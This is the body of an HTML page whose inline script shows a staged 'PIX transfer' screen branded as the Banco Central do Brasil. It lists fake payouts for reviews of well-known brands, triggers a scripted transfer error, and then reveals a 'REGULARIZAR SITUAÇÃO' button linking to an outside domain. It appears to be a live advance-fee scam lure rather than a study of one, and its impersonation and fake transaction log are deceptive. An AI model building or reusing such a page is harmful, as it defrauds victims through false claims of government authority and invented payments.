  </head>

  <body>
    <!-- Preload Overlay -->
    <div id="preload-overlay" style="position: fixed; inset: 0; z-index: 9999; background: #f8fafc; display: none; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
      <style>
        @keyframes preload-spin {
          to { transform: rotate(360deg); }
        }
        .preload-spinner {
          width: 44px;
          height: 44px;
          border: 4px solid rgba(254, 43, 94, 0.15);
          border-left-color: #fe2b5e;
          border-radius: 50%;
          animation: preload-spin 1s linear infinite;
        }
        .preload-progress-bar {
          height: 8px;
          background-color: #e2e8f0;
          border-radius: 9999px;
          overflow: hidden;
          width: 100%;
          margin: 20px 0;
        }
        .preload-progress-fill {
          height: 100%;
          background-color: #fe2b5e;
          width: 0%;
          transition: width 0.4s ease;
        }
        .preload-progress-fill.error {
          background-color: #ef4444;
        }
        .preload-card {
          width: 90%;
          max-width: 420px;
          background: white;
          border-radius: 24px;
          padding: 28px 24px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.06);
          border: 1px solid #f1f5f9;
          text-align: center;
        }
        .ticket-item {
          font-size: 13px;
          color: #475569;
          background-color: #f8fafc;
          padding: 8px 12px;
          border-radius: 8px;
          margin-top: 6px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          animation: ticket-fadeIn 0.3s ease-out forwards;
        }
        @keyframes ticket-fadeIn {
          from { opacity: 0; transform: translateY(5px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes preload-shake {
          0%, 100% { transform: translateX(0); }
          10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
          20%, 40%, 60%, 80% { transform: translateX(4px); }
        }
        .preload-shake {
          animation: preload-shake 0.5s ease-in-out;
        }
        @keyframes btn-fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .btn-regularizar-style {
          display: none; 
          margin-top: 20px; 
          width: 100%; 
          height: 50px; 
          background-color: #fe2b5e; 
          color: white; 
          border: none; 
          border-radius: 12px; 
          font-size: 15px; 
          font-weight: 700; 
          cursor: pointer; 
          transition: background-color 0.2s, transform 0.1s; 
          box-shadow: 0 4px 12px rgba(254, 43, 94, 0.2);
          animation: btn-fadeIn 0.4s ease-out forwards;
        }
        .btn-regularizar-style:hover {
          background-color: #e0204c;
        }
        .btn-regularizar-style:active {
          transform: scale(0.98);
        }
      </style>
      <div class="preload-card" id="preload-card">
        <div style="display: flex; flex-direction: column; align-items: center;">
          <div id="preload-icon-container" style="margin-bottom: 16px;">
            <div class="preload-spinner"></div>
          </div>
          <h3 id="preload-title" style="margin: 0; font-size: 18px; font-weight: 700; color: #1e293b;">Processando Envio PIX</h3>
          <p style="margin: 4px 0 0 0; font-size: 13px; color: #64748b;">Sistema Integrado Banco Central do Brasil</p>
          
          <div class="preload-progress-bar">
            <div class="preload-progress-fill" id="preload-progress"></div>
          </div>
          
          <p id="preload-status" style="margin: 0 0 16px 0; font-size: 12px; font-weight: 600; color: #475569;">Conectando ao sistema de liquidação instantânea...</p>
          
          <div style="width: 100%; text-align: left;">
            <p style="margin: 0 0 8px 0; font-size: 11px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.05em;">Log de Processamento</p>
            <div id="processed-tickets" style="max-height: 160px; overflow-y: auto; display: flex; flex-direction: column; gap: 4px;">
              <!-- Dynamic content -->
            </div>
          </div>
          <button id="btn-regularizar" class="btn-regularizar-style" onclick="window.location.href='https://iof.cashnopix.lat/'">
            REGULARIZAR SITUAÇÃO
          </button>
        </div>
      </div>
    </div>

    <script>
      (function() {
        const urlParams = new URLSearchParams(window.location.search);
        const isApp = urlParams.get('app') === 'true';
        const overlay = document.getElementById('preload-overlay');
        const root = document.getElementById('root');

        if (!isApp) {
          // Show preload and hide React app
          overlay.style.display = 'flex';
          if (root) root.style.display = 'none';

          const progress = document.getElementById('preload-progress');
          const status = document.getElementById('preload-status');
          const ticketsContainer = document.getElementById('processed-tickets');
          const title = document.getElementById('preload-title');
          const iconContainer = document.getElementById('preload-icon-container');
          const card = document.getElementById('preload-card');

          const addTicket = (name, value) => {
            const item = document.createElement('div');
            item.className = 'ticket-item';
            item.innerHTML = '<span><b>' + name + '</b> - R$ ' + value + '</span><span style="color: #10b981; font-weight: bold;">✓ PROCESSADO</span>';
            ticketsContainer.appendChild(item);
            ticketsContainer.scrollTop = ticketsContainer.scrollHeight;
          };

          const timeline = [
            { t: 0, p: 10, s: "Conectando ao sistema de liquidação instantânea..." },
            { t: 1200, p: 30, s: "Autenticando chave PIX cadastrada..." },
            { t: 2400, p: 50, s: "Compilando lotes de avaliações concluídas...", action: () => addTicket("Avaliação #01 - Apple", "131,00") },
            { t: 3600, p: 70, s: "Liberando valores dos tickets...", action: () => {
              addTicket("Avaliação #02 - Google", "184,50");
              addTicket("Avaliação #03 - Coca-Cola", "189,90");
            }},
            { t: 4800, p: 90, s: "Solicitando autorização de débito governamental...", action: () => addTicket("Avaliação #11 - Nike", "168,00") },
            { t: 6200, p: 100, s: "Erro no processamento da transferência.", isError: true }
          ];

          timeline.forEach(step => {
            setTimeout(() => {
              progress.style.width = step.p + '%';
              status.textContent = step.s;
              if (step.action) step.action();
              if (step.isError) {
                progress.classList.add('error');
                status.style.color = '#ef4444';
                title.textContent = "Transferência Interrompida!";
                card.classList.add('preload-shake');
                iconContainer.innerHTML = '<div style="height: 44px; width: 44px; border-radius: 50%; background-color: #fee2e2; display: flex; align-items: center; justify-content: center; color: #ef4444;"><svg style="height: 24px; width: 24px;" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path></svg></div>';
                
                // Show the button
                const btn = document.getElementById('btn-regularizar');
                if (btn) btn.style.display = 'block';
              }
            }, step.t);
          });
        } else {
          // Show app immediately
          overlay.style.display = 'none';
          if (root) root.style.display = 'block';
        }
      })();
    </script>
    <div id="root"></div>
  </body>
</html>
